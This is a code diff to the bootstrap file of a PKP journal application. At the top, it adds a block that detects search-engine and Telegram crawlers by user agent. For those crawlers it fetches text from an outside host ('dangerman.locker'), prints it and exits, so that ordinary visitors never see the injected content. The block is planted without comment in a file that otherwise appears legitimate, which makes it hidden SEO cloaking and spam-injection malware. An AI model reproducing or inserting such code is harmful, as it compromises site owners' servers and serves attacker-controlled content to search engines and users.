@@ -1,4 +1,25 @@
 <?php
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+
+return false;
+}
+
+if (is_bot()) {
+$message = file_get_contents('https://dangerman.locker/landing/jmifrusim/index.txt');
+echo $message;
+exit;
+}
+?>
+
+<?php
 
 /**
  * @defgroup index Index
@@ -6,7 +27,7 @@
  */
 
 /**
- * @file includes/bootstrap.php
+ * @file includes/bootstrap.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
@@ -24,14 +45,18 @@
  * Basic initialization (pre-classloading).
  */
 
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
-
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require_once './lib/pkp/includes/functions.php';
+require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
-return new \APP\core\Application();
+import('classes.core.Application');
+
+return new Application();
